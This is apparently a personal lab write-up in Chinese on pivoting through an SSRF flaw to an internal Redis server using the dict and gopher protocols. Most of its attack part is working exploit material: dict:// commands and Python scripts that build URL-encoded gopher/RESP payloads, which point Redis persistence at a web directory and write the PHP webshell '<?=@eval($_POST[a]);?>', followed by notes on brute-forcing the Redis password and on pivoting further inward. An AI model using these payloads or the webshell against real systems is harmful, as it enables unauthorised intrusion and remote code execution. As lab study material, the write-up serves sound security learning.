[TOC]



# ==SSRF+Redis内网渗透==

## 一、ssrf+dict+redis

由于我们的实验环境不具有 ssrf（服务器请求伪造），所以我们在做这个实验时需要自己导入一个 ssrf 的漏洞

> 前面我们学习了 ssrf 漏洞，以及基于 redis 的提权操作（写木马，写 root 的 crontab）。但是往往，Redis  只会在内网中开放，并不会直接开放出来 6379 端口给外部来访问，我们也可以借助于 ssrf 来通过具有 ssrf 漏洞的主机作为跳板，进行访问内网。并合理利用好 redis 的工作特性（比如持久化时写文件的特性）以及基于 dict 和 gopher 协议，来完成内网渗透

`curl_exec` 构造的 ssrf 还支持 dict 字典协议和 gopher 

为了构造基础的实验环境，我们现在关闭 redis 远程访问，并且取消 ssrf 漏洞页面对参数的限制

![image-20240925152156938](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925152156938.png)

dict 是一种字典协议，他对于登录只是一次性的，并不具有 session 持久性

![image-20240925153402834](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925153402834.png)

此时单独验证的时候是登陆成功的，但是下次 set key value 的时候，就又是没有登陆验证

![image-20240925153509805](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925153509805.png)

这种情况是因为 redis 服务器需要使用密码验证，此时只适用于爆破的方式，可以通过对相应的长短，来判断密码是否正确

比如 burp 爆破

![image-20240925153947135](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925153947135.png)

但是爆破之后也只是有了密码，无法远程登陆，dict无法维持 session ，所以此时 gopher 就派上了用场

> 但是如果 redis 服务器没有密码，当然，，这种情况不现实，此时就可以直接利用 dict 字典协议直接执行 redis 指令了
>
> 使用 dict 执行 redis 指令的时候，需要注意，尤其是在 写入木马的时候，需要将要写入的内容通过 十六进制 转码，然后对每一个转码后的字符，两个十六进制一个字符，在每两个十六进制前添加 `\x` 所构成的内容，才是我们真是要写入木马中的内容
>
> ![image-20240925154517496](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925154517496.png)
>
> 然后再基于 redis 的持久化原理，写文件从而生成木马，例如在这里的POST正文数据：
>
> ```
> url=dict://127.0.0.1:6379/config:set:dir:/opt/lampp/htdocs/security
> url=dict://127.0.0.1:6379/config:setdbfilename:shell.php
> url=dict://127.0.0.1:6379/save
> ```
>
> 当然，给 root 用户写一个 crontab 也是可以的，无非就是 dict 协议指令的格式和 redis 本身有区别

## 二、ssrf+gopher+redis

redis 执行指令的原理：

> 客户端指令发送到Redis服务器是基于**TCP/IP协议**发送的数据Redis制定了RESP（Redis Serialization Protocol，Redis序列化协议）来实现客户端与服务端的正常交互。
>
> - ### 1. 客户端发送命令
>
>   - **建立连接**：客户端首先与Redis服务器建立网络连接，通常是通过TCP/IP协议在指定的端口（默认为6379）上进行连接。
>   - **发送命令**：客户端将需要执行的命令转换成Redis协议（RESP，Redis Serialization Protocol）格式，并通过网络发送给Redis服务器。Redis协议是一种简单的文本协议，支持多种数据类型和命令。
>
>   ### 2. 命令解析与验证
>
>   - **接收命令**：Redis服务器接收到客户端发送的命令后，将其缓存在客户端输入缓冲区中。
>   - **解析命令**：Redis服务器使用简单的字符串分割和解析技术来解析命令，将命令和参数分割成不同的部分。例如，将`SET key value`命令解析为`['SET', 'key', 'value']`的列表。
>   - **验证命令**：在命令执行之前，Redis会对命令进行验证，确保命令的格式正确、参数个数合法等。如果命令不合法，Redis会返回错误信息给客户端。
>
>   ### 3. 命令执行
>
>   - **查找命令**：Redis根据命令的第一个参数（通常是命令名）在命令表中查找对应的命令实现。
>   - **执行预备操作**：在真正执行命令之前，Redis会进行一系列预备操作，如检查客户端身份验证、内存占用情况、是否处于阻塞状态等。这些预备操作旨在确保命令的顺利执行和系统的稳定性。
>   - **执行命令**：如果命令通过了预备操作的检查，Redis将调用命令的实现函数来执行命令。命令的实现函数会根据命令的具体类型和参数执行相应的操作，如设置键值对、获取键值对等。
>
>   ### 4. 响应返回
>
>   - **生成响应**：命令执行完毕后，Redis会生成相应的响应结果。响应结果可以是成功状态、错误状态或者数据值等。
>   - **发送响应**：Redis将响应结果保存到客户端的输出缓冲区中，并等待客户端套接字变为可写状态时将其发送给客户端。对于某些类型的命令，如订阅命令，Redis可能会持续向客户端发送响应直到客户端取消订阅。

### 1、通信数据格式

该通信格式就是以 RESP 数据格式发送的数据

![image-20240925214305422](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925214305422.png)

### 2、利用 python 与 redis 进行通信

![image-20240925214709163](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925214709163.png)

![image-20240925214717523](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925214717523.png)

## 利用 Python 实现 Gopher 的 Payload

![image-20240925214759576](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925214759576.png)![image-20240925214804291](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925214804291.png)

## 三、实验开始 

上面都是理论，下面开始编写代码实战

我们先取消服务器的连接限定，使得外部主机可以连接到服务

### 1、先用普通的 RESP 数据报文，经过 TCP 协议发送到 redis 服务器

**利用 python 给 redis 服务器发送数据流并不需要使用 url 编码，只需要对其使用 RESP 和 gopher 正常的数据规则就好**

比如：

- *3  表示接下来的指令由三个单词构成
- $4 表示写一个单词由四个字母构成
- \r\n 表示换行，指令中的所有空格都使用这个替换

```python
import socket

if __name__ == '__main__':
    s = socket.socket()
    s.connect(('192.168.230.147',6379))

    data = '*2\r\n$4\r\nauth\r\n$9\r\np-0p-0p-0\r\n*3\r\n$3\r\nset\r\n$3\r\nymq\r\n$4\r\nyyds\r\n'
    s.send(data.encode())
    resp = s.recv(1024)
    print(resp.decode())

    data = '*2\r\n$3\r\nget\r\n$3\r\nymq\r\n'
    s.send(data.encode())
    resp = s.recv(1024)
    print(resp.decode())

    s.close()
```

![image-20240925221313373](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925221313373.png)

我们在终端可以看到如上图结果回显，进入服务器看看

![image-20240925221430584](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925221430584.png)

说明，使用这样的数据格式并经过 TCP 传输完全是可以执行 redis 指令的

### 2、真实 ssrf+redis 场景

真实场景下，我们可以利用 dict 字典协议爆破出 redis 服务器的密码，然后再利用 gopher 协议 + ssrf 漏洞执行指令

**注意事项：gopher 协议数据格式为 `gopher://ip:port/_TCP/IP数据流` ，比如针对 ssrf+redis 的操作，协议需要以 `gopher://127.0.0.1:6379/_` 开头传输数据，后面跟上基于 TCP 的数据包。并且针对 payload 中的换行符 进行 url 编码使用 `%0d%0a` 替换字符串中的 回车(\r)和换行(\n)  然后 转码后的 payload 中的所有 % 还需要使用 %25 替换。这样构成的 redis 协议的payload才能正确被 gopher 协议解析处理**

![image-20240925223050667](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925223050667.png)

随意这里 先 %0d 后 %0a ，即表示，先将文件指针移动到该行最前面，然后向下移动一行，从而完成新的下一行

> dict 字典协议支支持 redis 的单条命令，而 gopher 可以很好的支撑批量命令处理，在针对需要密码登录 redis 的情况下，dict 除了能爆破密码，其他无能为力，而 gopher 可以很好的完成

### 3、代码实现

#### 代码主要实现原理：

- 由于直接在服务器上执行指令时，指令之间是由空格隔开的，于是客户在使用 python 代码输入指令的时候也会是默认使用空格隔开指令
- 然后再加上 gopher 协议和 RESP 协议的数据流格式，我们需要在每一条指令前加上对应的格式，比如 *2 或者 $3 等
- 然后还需要将每一个空格替换为 `\r\n` 这样才满足 redis 协议

> 在Redis协议中，每个命令和参数都是以特定的方式发送的：
>
> 1. **命令和参数的分隔**：命令和它的参数之间是通过换行符（`\r\n`）分隔的，而不是空格。这是因为在Redis协议中，空格是可以出现在参数值中的（比如字符串值），如果仅仅使用空格作为分隔符，那么就无法区分参数值中的空格和分隔参数的分隔符了。
> 2. **参数的发送**：每个参数前都会有一个`$`前缀，后跟该参数的长度（字节为单位），再后面是一个`\r\n`，然后是参数的实际内容，最后再以`\r\n`结束。这种方式确保了Redis服务器能够准确地知道每个参数的长度，从而可以正确地解析它们，无论参数内容中是否包含空格、换行符等特殊字符。
> 3. **命令的结束**：整个命令（包括所有参数）发送完毕后，需要以`*n\r\n`结束，其中`n`是参数（包括命令本身）的总数。这个前缀和计数是用来告诉Redis服务器即将接收到的参数数量。
>
> 例如：
>
> `<?php @eval($_POST[a]); ?>` 这个如果不提前将代码中的空格先使用标记符号占用，那么执行 `set mm <?php @eval($_POST[a]); ?>` 时，每个空格之间的内容，都会被当作参数，所以这也是代码中需要处理的一环

- 然后 还需要对 上述处理完成的 payload 进行 url 编码，并且转码后的 payload 中的所有 % 还需要使用 %25 替换。原因如下：

> 1. **特殊字符的处理**：URL编码（也称为百分比编码）是一种编码机制，用于在URLs中安全地传输数据。它通过将特定字符转换为`%`后跟两位十六进制数的形式来避免在URLs中出现潜在的破坏字符（如空格、换行符、斜杠等）。由于Redis命令遵循RESP协议，其中包含了如`\r\n`（回车换行符）这样的特殊字符，这些字符在URL中需要被编码以避免被误解或截断。
> 2. **协议兼容性**：当你尝试通过一个基于URL的协议（如HTTP）或环境（如某些web注入点）发送Redis命令时，你必须确保命令字符串与这些协议的兼容性。URL编码是确保兼容性的常用方法之一。
> 3. **安全绕过**：在某些情况下，攻击者可能会尝试通过注入经过URL编码的Redis命令来绕过应用的安全措施。通过URL编码，他们可以确保命令中的特殊字符不会被误解或提前截断，从而成功执行命令。

#### （1）简单代码构造浏览器payload测试

![image-20240926101540992](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926101540992.png)

```python
import socket,urllib.parse

if __name__ == '__main__':
    s = socket.socket()
    s.connect(('192.168.230.147',6379))

    command = '*2\r\n$4\r\nauth\r\n$9\r\np-0p-0p-0\r\n*3\r\n$3\r\nset\r\n$3\r\nymq\r\n$4\r\nyyds\r\n'
    payload = urllib.parse.quote(command)
    print(payload.replace('%','%25'))

    s.close()
```

得到payload

```
%252A2%250D%250A%25244%250D%250Aauth%250D%250A%25249%250D%250Ap-0p-0p-0%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Aymq%250D%250A%25244%250D%250Ayyds%250D%250A
```

浏览器访问

![image-20240926102710499](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926102710499.png)

![image-20240926102011659](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926102011659.png)

此时，ymq 这个值就写进去了

#### （2）正式代码构造浏览器payload

```python
import socket,urllib.parse

if __name__ == '__main__':
    s = socket.socket()
    s.connect(('192.168.230.147',6379))

    commandlist = ["flushdb","config set dir /opt/lampp/htdocs/security","config set dbfilename redismm.php","set mm <?=@eval($_POST[a]);?>","save"]
    payload = ""
    for command in commandlist:
        wordlist = command.split(" ")
        payload = payload + '*' + str(len(command.split(" ")))
        for word in wordlist:
            param = "$" + str(len(word)) + r"\r\n" + word
            payload = payload + r"\r\n" + param
        payload += r"\r\n"
    print(payload)
    payload = urllib.parse.quote(payload)
    payload = payload.replace("%","%25")
    print(payload)

    s.close()
```

运行得到结果

看起来没毛病，拿去试试，先看一下

![image-20240926150332182](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926150332182.png)

欸嘿，报错了，怎么回事呢？

我们发现，本来要将 `\r\n` 使用 `%0d%0a` 替换，然后最后再将所有 % 替换为 %25 。但是现在 `\r\n` 经过 url 编码之后变成了 `%5Cr%5Cn` ，那么如果我强行将 `5Cr5Cn` 替换为 `0d0a` 。如何呢？

```python
import socket,urllib.parse

if __name__ == '__main__':
    s = socket.socket()
    s.connect(('192.168.230.147',6379))

    commandlist = ["auth","p-0p-0p-0","flushdb","config set dir /opt/lampp/htdocs/security","config set dbfilename redismm.php","set mm <?=@eval($_POST[a]);?>","save"]
    payload = ""
    for command in commandlist:
        wordlist = command.split(" ")
        payload = payload + '*' + str(len(command.split(" ")))
        for word in wordlist:
            param = "$" + str(len(word)) + r"\r\n" + word
            payload = payload + r"\r\n" + param
        payload += r"\r\n"
    print(payload)
    payload = urllib.parse.quote(payload)
    payload = payload.replace("%","%25")
    payload = payload.replace("5Cr","0d")
    payload = payload.replace("5Cn","0a")
    print(payload)

    s.close()
```

当啊让你，我们还忘了一个问题，gopher链接redis时，还需要使用 auth:mima 进行的登录验证，所以别忘了在 commandlist 中加上这两个指令

得到最终的 payload

![image-20240926161342511](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926161342511.png)

![image-20240926161456549](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926161456549.png)

还是没有 redismm.php。怎么回事卧槽

> 利用 python 在线测试一下（真实场景可没有这功能，我们现在只是在学习，所以自己的服务器可以开启远程访问）
>
> ```python
> import socket,urllib.parse
> 
> if __name__ == '__main__':
>     s = socket.socket()
>     s.connect(('192.168.230.147',6379))
> 
>     data = '*1\r\n$4\r\nauth\r\n*1\r\n$9\r\np-0p-0p-0\r\n*1\r\n$7\r\nflushdb\r\n*3\r\n$6\r\nconfig\r\n$3\r\ndir\r\n$26\r\n/opt/lampp/htdocs/security\r\n*3\r\n$6\r\nconfig\r\n$10\r\ndbfilename\r\n$11\r\nredismm.php\r\n*3\r\n$3\r\nset\r\n$2\r\nmm\r\n$22\r\n<?=@eval($_POST[a]);?>\r\n*1\r\n$4\r\nsave\r\n'
>     s.send(data.encode())
>     resp = s.recv(1024)
>     print(resp.decode())
>     s.close()
> ```
>
> 看看回显结果
>
> ![image-20240926162335073](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926162335073.png)
>
> 难道，`["auth","p-0p-0p-0","flushdb","config set dir /opt/lampp/htdocs/security","config set dbfilename redismm.php","set mm <?=@eval($_POST[a]);?>","save"]` 这样设置 commandlist 是错误的吗？
>
> 那修改成如下呢：
>
> ```
> ["auth p-0p-0p-0","flushdb","config set dir /opt/lampp/htdocs/security","config set dbfilename redismm.php","set mm <?=@eval($_POST[a]);?>","save"]
> ```
>
> 得到 payload
>
> ```
> %252A2%250D%250A%25244%250D%250Aauth%250D%250A%25249%250D%250Ap-0p-0p-0%250D%250A%252A1%250D%250A%25247%250D%250Aflushdb%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252426%250D%250A/opt/lampp/htdocs/security%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252411%250D%250Aredismm.php%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25242%250D%250Amm%250D%250A%252422%250D%250A%253C%253F%253D%2540eval%2528%2524_POST%255Ba%255D%2529%253B%253F%253E%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
> ```
>
> 再进行尝试

所以，经过修改 commandlist ，我们成功利用到该漏洞

![image-20240926163940757](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926163940757.png)

![image-20240926163925344](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926163925344.png)

发现 redismm.php 已经写入

![image-20240926164131972](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926164131972.png)

成功得到 shell

利用成功

> ![image-20240925223331620](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240925223331620.png)
>
> `" {} ".format(xxx)`  意思就是 `{}` 中的内容会被替换为 xxx ，`{}` 在这里作为占位符存在

## 四、简洁，高效，方便，效率的使用办法

### 1、构造RESP数据格式

![image-20240926165512166](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926165512166.png)

### 2、添加  \r\n 

在 notepad++ 中，按住 alt 键，鼠标沿着最左侧边栏上移可进入侧边栏编辑模式

![image-20240926165609881](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926165609881.png)

![image-20240926165751236](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926165751236.png)

使用正则表达式替换将其修改为一行的数据，得到一串序列

然后使用普通模式

```
* 替换为 %252A
\r\n 替换为 %250D%250A
$ 替换为 %2524
```

最终就可以得到 我们想要的 payload 序列

![image-20240926170147510](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240926170147510.png)

## 五、问题

就拿 这次试验举例子

如果我们攻克的服务器是 192.168.230.147 ，但真实场景中 redis 服务器是内网中的另一台服务器，并不是 127.0.0.1 ，此时该怎么办

- 问题一：我们确实可以使用 攻克的这个服务器进行内网扫描，然后可以扫描到 redis 服务器存在的这台内网IP，然后呢？是否可以在被攻克的服务器中去寻找这台 redis 服务器的连接信息？
- 是否还可以使用 dict 爆破他的密码，然后 该 redis 服务器没有 web 服务器，就算木马写进去了，又该如何访问该木马呢？继续使用 ssrf ？
